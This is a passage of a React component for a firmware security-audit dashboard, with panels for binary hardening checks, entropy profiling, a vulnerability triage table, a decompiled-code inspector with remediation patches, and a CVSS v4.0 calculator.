              <Binary className="w-4 h-4 text-neon-cyan" />
              <span>BINARY HARDENING (CHECKSEC)</span>
            </h2>
            <span className="text-[10px] text-zinc-400 font-mono">ELF HEADER AUDIT</span>
          </div>

          <div className="grid grid-cols-2 gap-2 text-xs">
            <div className="p-2.5 rounded-xl border border-zinc-800/80 bg-void-950 flex flex-col justify-between gap-1">
              <span className="text-[10px] text-zinc-400">STACK CANARY</span>
              <span className={`font-bold text-xs ${checksec.canary ? 'text-neon-emerald' : 'text-neon-crimson'}`}>
                {checksec.canary ? 'ENABLED (SAFE)' : 'DISABLED (EXPLOITABLE)'}
              </span>
            </div>

            <div className="p-2.5 rounded-xl border border-zinc-800/80 bg-void-950 flex flex-col justify-between gap-1">
              <span className="text-[10px] text-zinc-400">NX / DEP (EXEC STACK)</span>
              <span className={`font-bold text-xs ${checksec.nx ? 'text-neon-emerald' : 'text-neon-crimson'}`}>
                {checksec.nx ? 'NX ENABLED' : 'RWX STACK (0-DAY SINK)'}
              </span>
            </div>

            <div className="p-2.5 rounded-xl border border-zinc-800/80 bg-void-950 flex flex-col justify-between gap-1">
              <span className="text-[10px] text-zinc-400">PIE / ASLR POSITION</span>
              <span className={`font-bold text-xs ${checksec.pie ? 'text-neon-emerald' : 'text-neon-crimson'}`}>
                {checksec.pie ? 'DYN (PIE ON)' : 'NO PIE (STATIC 0x10000)'}
              </span>
            </div>

            <div className="p-2.5 rounded-xl border border-zinc-800/80 bg-void-950 flex flex-col justify-between gap-1">
              <span className="text-[10px] text-zinc-400">RELRO PROTECTION</span>
              <span className={`font-bold text-xs ${checksec.relro === 'FULL' ? 'text-neon-emerald' : 'text-neon-crimson'}`}>
                {checksec.relro}
              </span>
            </div>

            <div className="p-2.5 rounded-xl border border-zinc-800/80 bg-void-950 flex flex-col justify-between gap-1">
              <span className="text-[10px] text-zinc-400">FORTIFY_SOURCE</span>
              <span className={`font-bold text-xs ${checksec.fortify ? 'text-neon-emerald' : 'text-neon-amber'}`}>
                {checksec.fortify ? 'COMPILED WITH FORTIFY' : 'DISABLED (0)'}
              </span>
            </div>

            <div className="p-2.5 rounded-xl border border-zinc-800/80 bg-void-950 flex flex-col justify-between gap-1">
              <span className="text-[10px] text-zinc-400">RPATH / RUNPATH</span>
              <span className="font-bold text-xs text-neon-amber truncate">
                {checksec.rpath}
              </span>
            </div>
          </div>

          <div className="p-3 rounded-xl bg-void-950 border border-zinc-800 text-[11px] text-zinc-400 leading-relaxed">
            <span className="text-neon-crimson font-bold">VULNERABILITY IMPACT:</span> With both Stack Canary and NX disabled, stack overflows allow immediate arbitrary shellcode execution via direct jump into the corrupted stack frame.
          </div>
        </div>

        {/* Panel 3B: Shannon Entropy Forensics (Partition Layout) */}
        <div className="p-5 rounded-2xl border border-zinc-800 bg-[#080d17] flex flex-col gap-4 lg:col-span-2">
          <div className="flex items-center justify-between border-b border-zinc-800/80 pb-3">
            <h2 className="text-xs font-bold text-white flex items-center gap-2">
              <Layers className="w-4 h-4 text-neon-cyan" />
              <span>SHANNON ENTROPY FORENSIC PROFILE (0.00 TO 8.00 BITS/BYTE)</span>
            </h2>
            <span className="text-[10px] text-zinc-400 font-mono">FILE OFFSET MAPPING</span>
          </div>

          {/* Visual Entropy Bar */}
          <div className="h-6 w-full rounded-xl overflow-hidden flex border border-zinc-800">
            <div className="w-[10%] bg-blue-900/60 border-r border-zinc-800 flex items-center justify-center text-[9px] font-bold text-blue-200">
              BOOT (4.82)
            </div>
            <div className="w-[30%] bg-cyan-900/60 border-r border-zinc-800 flex items-center justify-center text-[9px] font-bold text-cyan-200">
              KERNEL .TEXT (6.14)
            </div>
            <div className="w-[50%] bg-purple-900/80 border-r border-zinc-800 flex items-center justify-center text-[9px] font-bold text-purple-200">
              SQUASHFS COMPRESSED (7.96)
            </div>
            <div className="w-[10%] bg-neon-crimson/40 flex items-center justify-center text-[9px] font-bold text-neon-crimson animate-pulse">
              KEYS (5.18)
            </div>
          </div>

          {/* Table of Entropy Partitions */}
          <div className="overflow-x-auto rounded-xl border border-zinc-800 bg-void-950">
            <table className="w-full text-left text-xs">
              <thead>
                <tr className="bg-void-900 text-zinc-400 border-b border-zinc-800 text-[10px]">
                  <th className="py-2 px-3 font-bold">SECTION</th>
                  <th className="py-2 px-3 font-bold">OFFSET RANGE</th>
                  <th className="py-2 px-3 font-bold">ENTROPY</th>
                  <th className="py-2 px-3 font-bold">FORENSIC ASSESSMENT</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-zinc-800/60 text-[11px]">
                {ENTROPY_REGIONS.map((r, idx) => (
                  <tr key={idx} className="hover:bg-void-900/40">
                    <td className="py-2 px-3 font-bold text-white">{r.name}</td>
                    <td className="py-2 px-3 text-zinc-400 font-mono text-[10px]">
                      {r.startOffset} - {r.endOffset}
                    </td>
                    <td className="py-2 px-3 font-bold">
                      <span className={r.entropy > 7.5 ? 'text-neon-purple' : r.entropy > 5.5 ? 'text-neon-cyan' : 'text-neon-amber'}>
                        {r.entropy.toFixed(2)} b/B
                      </span>
                    </td>
                    <td className="py-2 px-3 text-zinc-300">{r.assessment}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </div>

      {/* 4. Flagged Dangerous C API Calls (Static Detection) */}
      <div className="p-5 rounded-2xl border border-zinc-800 bg-[#080d17] flex flex-col gap-3">
        <div className="flex items-center justify-between border-b border-zinc-800/80 pb-3">
          <h2 className="text-xs font-bold text-white flex items-center gap-2">
            <AlertTriangle className="w-4 h-4 text-neon-crimson" />
            <span>DANGEROUS INSECURE C/C++ API INVOCATIONS DETECTED IN BINARY</span>
          </h2>
          <span className="text-[10px] text-neon-crimson font-bold bg-neon-crimson/10 px-2 py-0.5 rounded border border-neon-crimson/30">
            5 DANGEROUS CALL SITES
          </span>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-3">
          {DANGEROUS_CALLS.map((call, idx) => (
            <div
              key={idx}
              className="p-3.5 rounded-xl border border-zinc-800 bg-void-950 flex flex-col justify-between gap-2 hover:border-zinc-700 transition-colors"
            >
              <div>
                <div className="flex items-center justify-between">
                  <span className="font-bold text-sm text-neon-crimson font-mono">{call.funcName}</span>
                  <span
                    className={`px-1.5 py-0.5 rounded text-[9px] font-bold ${
                      call.vulnRisk === 'CRITICAL'
                        ? 'bg-neon-crimson/20 text-neon-crimson border border-neon-crimson/30'
                        : 'bg-neon-amber/20 text-neon-amber border border-neon-amber/30'
                    }`}
                  >
                    {call.vulnRisk}
                  </span>
                </div>
                <div className="text-[11px] text-white font-bold mt-1 truncate">{call.caller}</div>
                <div className="text-[10px] text-zinc-500 font-mono">Addr: {call.address}</div>
              </div>

              <div className="text-[10px] text-zinc-400 line-clamp-3 pt-2 border-t border-zinc-800/60 leading-tight">
                {call.detail}
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* 5. Comprehensive Real-World Vulnerability Catalog & Interactive Triage Matrix */}
      <div className="p-6 rounded-2xl border border-zinc-800 bg-[#080d17] flex flex-col gap-5 shadow-2xl">
        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4 border-b border-zinc-800/80 pb-4">
          <div>
            <div className="flex items-center gap-2.5">
              <h2 className="text-base font-bold text-white font-heading">
                ACTIVE VULNERABILITY CATALOG & TRIAGE WORKBENCH
              </h2>
              <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-neon-cyan/15 text-neon-cyan border border-neon-cyan/30">
                {filteredVulns.length} MATCHING
              </span>
            </div>
            <p className="text-xs text-zinc-400 mt-1">
              CVSS v4.0 scores, EPSS exploitation likelihood, and real-world triage actions for IoT/OT binaries.
            </p>
          </div>

          {/* Search & Filters */}
          <div className="flex flex-wrap items-center gap-2">
            <div className="relative">
              <input
                type="text"
                placeholder="Search CVE, ID, function..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-56 px-3 py-1.5 pl-8 rounded-xl bg-void-950 border border-zinc-800 text-xs text-white placeholder-zinc-500 focus:outline-none focus:border-neon-cyan"
              />
              <Search className="w-3.5 h-3.5 text-zinc-500 absolute left-2.5 top-2.5" />
            </div>

            {/* Severity Filter */}
            <div className="flex items-center gap-1 bg-void-950 p-1 rounded-xl border border-zinc-800 text-[11px]">
              {['ALL', 'CRITICAL', 'HIGH', 'MEDIUM'].map((sev) => (
                <button
                  key={sev}
                  onClick={() => setSeverityFilter(sev)}
                  className={`px-2 py-1 rounded-lg transition-all ${
                    severityFilter === sev
                      ? 'bg-neon-cyan text-void-950 font-bold'
                      : 'text-zinc-400 hover:text-white'
                  }`}
                >
                  {sev}
                </button>
              ))}
            </div>

            {/* CISA KEV Toggle */}
            <button
              onClick={() => setCisaKevOnly(!cisaKevOnly)}
              className={`px-2.5 py-1.5 rounded-xl border text-xs font-bold transition-all ${
                cisaKevOnly
                  ? 'bg-neon-crimson text-white border-neon-crimson shadow-[0_0_10px_rgba(255,0,85,0.3)]'
                  : 'bg-void-950 text-zinc-400 border-zinc-800 hover:text-white'
              }`}
            >
              CISA KEV ONLY
            </button>
          </div>
        </div>

        {/* Vulnerability Table */}
        <div className="overflow-x-auto rounded-xl border border-zinc-800 bg-void-950">
          <table className="w-full text-left text-xs">
            <thead>
              <tr className="bg-void-900 text-zinc-400 border-b border-zinc-800 text-[11px]">
                <th className="py-3 px-4 font-bold">VULNERABILITY IDENTIFIER</th>
                <th className="py-3 px-4 font-bold">CVSS v4.0</th>
                <th className="py-3 px-4 font-bold">EPSS (PROBABILITY)</th>
                <th className="py-3 px-4 font-bold">AFFECTED SINK / BINARY</th>
                <th className="py-3 px-4 font-bold">SSVC ACTION</th>
                <th className="py-3 px-4 font-bold">TRIAGE STATUS</th>
                <th className="py-3 px-4 font-bold text-right">ACTION</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-zinc-800/60">
              {filteredVulns.map((v) => {
                const isSelected = v.id === selectedVulnId;
                return (
                  <tr
                    key={v.id}
                    onClick={() => setSelectedVulnId(v.id)}
                    className={`cursor-pointer transition-colors ${
                      isSelected
                        ? 'bg-neon-cyan/10 border-l-4 border-l-neon-cyan'
                        : 'hover:bg-void-900/50'
                    }`}
                  >
                    <td className="py-3 px-4">
                      <div className="font-bold text-white flex items-center gap-2">
                        <span>{v.id}</span>
                        {v.cveId && (
                          <span className="text-zinc-400 text-[11px] font-mono">({v.cveId})</span>
                        )}
                        {v.cisaKev && (
                          <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-neon-crimson/20 text-neon-crimson border border-neon-crimson/40">
                            KEV
                          </span>
                        )}
                      </div>
                      <div className="text-[11px] text-zinc-400 line-clamp-1 mt-0.5">{v.title}</div>
                    </td>

                    <td className="py-3 px-4">
                      <span
                        className={`px-2 py-0.5 rounded font-bold text-xs ${
                          v.cvssV4 >= 9.0
                            ? 'bg-neon-crimson/20 text-neon-crimson border border-neon-crimson/30'
                            : v.cvssV4 >= 7.0
                            ? 'bg-neon-amber/20 text-neon-amber border border-neon-amber/30'
                            : 'bg-neon-cyan/20 text-neon-cyan border border-neon-cyan/30'
                        }`}
                      >
                        {v.cvssV4.toFixed(1)}
                      </span>
                    </td>

                    <td className="py-3 px-4">
                      <div className="flex items-center gap-2">
                        <span className="font-bold text-white">{(v.epssScore * 100).toFixed(1)}%</span>
                        <div className="w-16 h-1.5 rounded-full bg-void-900 overflow-hidden">
                          <div
                            className="h-full bg-neon-crimson"
                            style={{ width: `${v.epssScore * 100}%` }}
                          />
                        </div>
                      </div>
                    </td>

                    <td className="py-3 px-4 font-mono text-[11px] text-zinc-300">
                      <div>{v.affectedBinary}</div>
                      <div className="text-zinc-500 text-[10px]">Offset: {v.offset}</div>
                    </td>

                    <td className="py-3 px-4">
                      <span
                        className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                          v.ssvcAction === 'ACT'
                            ? 'bg-neon-crimson/20 text-neon-crimson border border-neon-crimson/40 animate-pulse'
                            : 'bg-neon-amber/20 text-neon-amber border border-neon-amber/40'
                        }`}
                      >
                        {v.ssvcAction}
                      </span>
                    </td>

                    <td className="py-3 px-4" onClick={(e) => e.stopPropagation()}>
                      <select
                        value={v.triageStatus}
                        onChange={(e) =>
                          handleUpdateTriage(v.id, e.target.value as RealVulnerability['triageStatus'])
                        }
                        className="px-2 py-1 rounded bg-void-900 border border-zinc-700 text-xs text-white focus:outline-none focus:border-neon-cyan"
                      >
                        <option value="CONFIRMED_VULN">CONFIRMED VULN</option>
                        <option value="ACTIVE_TRIAGE">ACTIVE TRIAGE</option>
                        <option value="MITIGATED">MITIGATED (PATCH)</option>
                        <option value="FALSE_POSITIVE">FALSE POSITIVE</option>
                      </select>
                    </td>

                    <td className="py-3 px-4 text-right">
                      <button
                        onClick={() => setSelectedVulnId(v.id)}
                        className="px-2.5 py-1 rounded bg-void-900 hover:bg-neon-cyan/20 border border-zinc-800 text-neon-cyan text-[11px] font-bold transition-all"
                      >
                        Inspect Code
                      </button>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>
      </div>

      {/* 6. Side-by-Side Decompiled C & Assembly Disassembly Deep Inspector */}
      {selectedVuln && (
        <div className="p-6 rounded-2xl border border-neon-cyan/40 bg-[#080d17] flex flex-col gap-5 shadow-2xl">
          <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-3 border-b border-zinc-800/80 pb-4">
            <div>
              <div className="flex items-center gap-2">
                <span className="text-xs text-neon-cyan font-bold">DEEP BINARY INSPECTOR</span>
                <span className="text-zinc-600">&bull;</span>
                <span className="text-xs text-white font-mono">{selectedVuln.id}</span>
                {selectedVuln.cveId && (
                  <span className="text-xs text-zinc-400 font-mono">({selectedVuln.cveId})</span>
                )}
              </div>
              <h2 className="text-base font-bold text-white mt-1">{selectedVuln.title}</h2>
            </div>

            <div className="flex items-center gap-2">
              <span className="px-2.5 py-1 rounded bg-void-950 border border-zinc-800 text-xs text-zinc-300">
                {selectedVuln.cwe}
              </span>
              <button
                onClick={() => setCvssModalOpen(true)}
                title="Open Interactive CVSS v4.0 Metric Calculator"
                className="px-2.5 py-1 rounded bg-neon-crimson/20 hover:bg-neon-crimson/30 text-neon-crimson border border-neon-crimson/40 text-xs font-bold transition-all flex items-center gap-1.5 shadow-[0_0_10px_rgba(255,0,85,0.2)]"
              >
                <Sliders className="w-3.5 h-3.5" />
                <span>CVSS {selectedVuln.cvssV4} (CALCULATOR)</span>
              </button>
            </div>
          </div>

          <p className="text-xs text-zinc-300 bg-void-950 p-3 rounded-xl border border-zinc-800 leading-relaxed">
            {selectedVuln.description}
          </p>

          {/* Interactive Binary Reachability & Call-Chain Trace */}
          <div className="p-4 rounded-xl bg-void-950 border border-zinc-800 flex flex-col gap-2">
            <div className="flex items-center justify-between text-xs text-zinc-400">
              <span className="font-bold text-white flex items-center gap-2">
                <GitBranch className="w-3.5 h-3.5 text-neon-cyan" />
                BINARY REACHABILITY & EXPLOIT CALL-CHAIN TRACE
              </span>
              <span className="text-[10px] text-neon-emerald font-bold bg-neon-emerald/10 px-2 py-0.5 rounded border border-neon-emerald/30">
                EXPLOITABLE PATHWAY
              </span>
            </div>

            <div className="flex flex-wrap items-center gap-2 text-[11px] font-mono pt-1">
              <span className="px-2.5 py-1 rounded-lg bg-zinc-900 border border-zinc-700 text-zinc-300">
                [INGRESS] Radio / Network Frame
              </span>
              <span className="text-zinc-600">&rarr;</span>
              <span className="px-2.5 py-1 rounded-lg bg-zinc-900 border border-zinc-700 text-zinc-300">
                irq_handler_rx()
              </span>
              <span className="text-zinc-600">&rarr;</span>
              <span className="px-2.5 py-1 rounded-lg bg-zinc-900 border border-zinc-700 text-zinc-300">
                packet_demux()
              </span>
              <span className="text-zinc-600">&rarr;</span>
              <span className="px-2.5 py-1 rounded-lg bg-zinc-900 border border-zinc-700 text-zinc-300">
                {selectedVuln.affectedBinary.split('/').pop()}
              </span>
              <span className="text-zinc-600">&rarr;</span>
              <span className="px-2.5 py-1 rounded-lg bg-neon-crimson/20 border border-neon-crimson text-neon-crimson font-bold animate-pulse">
                {selectedVuln.title.split(' ')[0]} SINK @ {selectedVuln.offset}
              </span>
              <span className="text-zinc-600">&rarr;</span>
              <span className="px-2.5 py-1 rounded-lg bg-neon-purple/20 border border-neon-purple text-neon-purple font-bold">
                CORRUPTION &bull; ROOT SHELL TAKEOVER
              </span>
            </div>
          </div>

          {/* Action Ribbon: Model Attack Graph, Digital Twin, Patch Studio */}
          <div className="flex flex-wrap items-center gap-3 pt-1">
            <Link
              href="/attack-graph"
              className="px-4 py-2 rounded-xl bg-neon-crimson text-white font-bold text-xs hover:bg-neon-crimson/90 transition-all flex items-center gap-2 shadow-[0_0_15px_rgba(255,0,85,0.3)]"
            >
              <GitBranch className="w-3.5 h-3.5" />
              <span>Model Attack Path in Dijkstra Solver</span>
            </Link>
            <Link
              href="/emulator"
              className="px-4 py-2 rounded-xl bg-void-900 hover:bg-void-800 border border-zinc-700 text-zinc-200 text-xs transition-colors flex items-center gap-2"
            >
              <Terminal className="w-3.5 h-3.5 text-neon-cyan" />
              <span>Launch in QEMU Digital Twin</span>
            </Link>
            <Link
              href="/patch-studio"
              className="px-4 py-2 rounded-xl bg-void-900 hover:bg-void-800 border border-zinc-700 text-zinc-200 text-xs transition-colors flex items-center gap-2"
            >
              <Sliders className="w-3.5 h-3.5 text-neon-emerald" />
              <span>Generate Hot-Patch in Studio</span>
            </Link>
          </div>

          {/* Side-by-Side Code Viewers */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
            {/* Left Pane: Decompiled C Pseudo-Code */}
            <div className="flex flex-col gap-2">
              <div className="flex items-center justify-between text-xs text-zinc-400 border-b border-zinc-800 pb-2">
                <span className="font-bold text-neon-cyan flex items-center gap-1.5">
                  <FileCode className="w-3.5 h-3.5" />
                  DECOMPILED C PSEUDO-CODE (GHIDRA / IDA DECOMPILER)
                </span>
                <span className="text-[10px] font-mono text-zinc-500">Target: {selectedVuln.affectedBinary}</span>
              </div>
              <pre className="p-4 rounded-xl bg-void-950 border border-zinc-800 text-xs font-mono text-emerald-300 overflow-x-auto leading-relaxed max-h-[360px] whitespace-pre">
                {selectedVuln.decompiledC}
              </pre>
            </div>

            {/* Right Pane: Assembly Disassembly */}
            <div className="flex flex-col gap-2">
              <div className="flex items-center justify-between text-xs text-zinc-400 border-b border-zinc-800 pb-2">
                <span className="font-bold text-neon-purple flex items-center gap-1.5">
                  <Terminal className="w-3.5 h-3.5" />
                  DISASSEMBLED INSTRUCTION TRACE ({activeProfile.architecture.split(' ')[0]})
                </span>
                <span className="text-[10px] font-mono text-zinc-500">Offset: {selectedVuln.offset}</span>
              </div>
              <div className="p-4 rounded-xl bg-void-950 border border-zinc-800 text-xs font-mono text-zinc-300 overflow-x-auto max-h-[360px] flex flex-col gap-1.5">
                {selectedVuln.disassembly.map((insn, idx) => (
                  <div
                    key={idx}
                    className={`p-1 rounded font-mono ${
                      insn.includes('OVERFLOW') || insn.includes('Insecure') || insn.includes('Executes')
                        ? 'bg-neon-crimson/15 text-neon-crimson font-bold border-l-2 border-l-neon-crimson pl-2'
                        : 'text-zinc-300'
                    }`}
                  >
                    {insn}
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Remediation Patch Diff */}
          <div className="flex flex-col gap-2 mt-2 pt-4 border-t border-zinc-800/80">
            <span className="text-xs font-bold text-neon-emerald flex items-center gap-1.5">
              <CheckCircle2 className="w-4 h-4" />
              RECOMMENDED C REMEDIATION & BOUNDS ENFORCEMENT PATCH
            </span>
            <pre className="p-4 rounded-xl bg-void-950 border border-emerald-900/40 text-xs font-mono text-emerald-400 overflow-x-auto whitespace-pre leading-relaxed">
              {selectedVuln.remediationPatch}
            </pre>
          </div>
        </div>
      )}

      {/* 7. Interactive CVSS v4.0 Vector Calculator Modal */}
      {cvssModalOpen && (
        <div
          role="dialog"
          aria-modal="true"
          onClick={() => setCvssModalOpen(false)}
          className="fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4"
        >
          <div
            onClick={(e) => e.stopPropagation()}
            className="w-full max-w-2xl bg-[#080d17] border border-neon-cyan/50 rounded-2xl p-6 shadow-2xl flex flex-col gap-5 text-xs font-mono"
          >
            <div className="flex items-center justify-between border-b border-zinc-800 pb-3">
              <div className="flex items-center gap-2">
                <Sliders className="w-4 h-4 text-neon-cyan" />
                <h3 className="text-sm font-bold text-white">INTERACTIVE CVSS v4.0 METRIC CALCULATOR</h3>
              </div>
              <button
                onClick={() => setCvssModalOpen(false)}
                className="p-1 rounded hover:bg-zinc-800 text-zinc-400 hover:text-white"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            {/* Score Display Banner */}
            <div className="p-4 rounded-xl bg-void-950 border border-zinc-800 flex items-center justify-between">
              <div>
                <span className="text-[10px] text-zinc-400 uppercase">CALCULATED CVSS v4.0 SCORE</span>
                <div className="text-3xl font-black text-neon-crimson font-heading">
                  {calculatedCvssScore.toFixed(1)} / 10.0
                </div>
              </div>
              <div className="text-right font-mono text-[11px] text-neon-cyan max-w-xs break-all">
                CVSS:4.0/AV:{cvssVector.av}/AC:{cvssVector.ac}/AT:{cvssVector.at}/PR:{cvssVector.pr}/UI:{cvssVector.ui}/VC:{cvssVector.vc}/VI:{cvssVector.vi}/VA:{cvssVector.va}/SC:{cvssVector.sc}/SI:{cvssVector.si}/SA:{cvssVector.sa}
              </div>
            </div>

            {/* Metric Selectors */}
            <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
              <div>
                <label className="text-[10px] text-zinc-400 block mb-1">Attack Vector (AV)</label>
                <select
                  value={cvssVector.av}
                  onChange={(e) => setCvssVector({ ...cvssVector, av: e.target.value })}
                  className="w-full px-2 py-1.5 rounded bg-void-950 border border-zinc-700 text-white"
                >
                  <option value="N">Network (N)</option>
                  <option value="A">Adjacent (A)</option>
                  <option value="L">Local (L)</option>
                  <option value="P">Physical (P)</option>
                </select>
              </div>

              <div>
                <label className="text-[10px] text-zinc-400 block mb-1">Attack Complexity (AC)</label>
                <select
                  value={cvssVector.ac}
                  onChange={(e) => setCvssVector({ ...cvssVector, ac: e.target.value })}
                  className="w-full px-2 py-1.5 rounded bg-void-950 border border-zinc-700 text-white"
                >
                  <option value="L">Low (L)</option>
                  <option value="H">High (H)</option>
                </select>
              </div>

              <div>
                <label className="text-[10px] text-zinc-400 block mb-1">Privileges Required (PR)</label>
                <select
                  value={cvssVector.pr}
                  onChange={(e) => setCvssVector({ ...cvssVector, pr: e.target.value })}
                  className="w-full px-2 py-1.5 rounded bg-void-950 border border-zinc-700 text-white"
                >
                  <option value="N">None (N)</option>
                  <option value="L">Low (L)</option>
                  <option value="H">High (H)</option>
                </select>
              </div>

              <div>
                <label className="text-[10px] text-zinc-400 block mb-1">Vuln Conf Impact (VC)</label>
                <select
                  value={cvssVector.vc}
                  onChange={(e) => setCvssVector({ ...cvssVector, vc: e.target.value })}
                  className="w-full px-2 py-1.5 rounded bg-void-950 border border-zinc-700 text-white"
                >
                  <option value="H">High (H)</option>
                  <option value="L">Low (L)</option>
                  <option value="N">None (N)</option>
                </select>
              </div>

              <div>
                <label className="text-[10px] text-zinc-400 block mb-1">Vuln Integ Impact (VI)</label>
                <select
                  value={cvssVector.vi}
                  onChange={(e) => setCvssVector({ ...cvssVector, vi: e.target.value })}
                  className="w-full px-2 py-1.5 rounded bg-void-950 border border-zinc-700 text-white"
                >
                  <option value="H">High (H)</option>
                  <option value="L">Low (L)</option>
                  <option value="N">None (N)</option>
                </select>
              </div>

              <div>
                <label className="text-[10px] text-zinc-400 block mb-1">Subsequent Conf (SC)</label>
                <select
                  value={cvssVector.sc}
                  onChange={(e) => setCvssVector({ ...cvssVector, sc: e.target.value })}
                  className="w-full px-2 py-1.5 rounded bg-void-950 border border-zinc-700 text-white"
                >
                  <option value="H">High (H)</option>
                  <option value="L">Low (L)</option>
                  <option value="N">None (N)</option>
                </select>
              </div>
            </div>

            <div className="flex items-center justify-end gap-2 pt-3 border-t border-zinc-800">
              <button
                onClick={() => setCvssModalOpen(false)}
                className="px-4 py-1.5 rounded-lg bg-neon-cyan text-void-950 font-bold hover:bg-neon-cyan/90 transition-all"
              >
                Apply to Report
              </button>
            </div>
          </div>
        </div>
      )}

    </div>
  );
}
